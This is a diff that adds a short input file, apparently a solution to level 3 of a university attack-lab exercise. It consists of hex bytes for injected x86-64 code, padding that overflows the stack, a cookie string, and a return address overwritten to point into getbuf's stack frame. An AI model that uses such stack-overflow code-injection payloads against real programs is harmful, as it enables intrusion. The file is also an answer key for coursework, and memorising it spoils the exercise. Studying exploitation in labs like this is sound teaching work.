@@ -1,0 +1,10 @@
+/* level3_input_back.txt */
+48 83 ec 10                      /* sub    $0x10,%rsp */
+48 89 e7                         /* mov    %rsp,%rdi */
+c6 44 24 08 00                   /*  movb   $0x0,0x8(%rsp) */
+68 fa 18 40 00                   /* pushq  $0x4018fa */
+c3                               /* retq   */
+41 41 41 41 41 41 41 41 41 41
+41 41 41 41                        /* 14 items to overflow the stack */
+35 39 62 39 39 37 66 61              
+78 dc 61 55 00 00 00 00          /* stack address in getbuf */
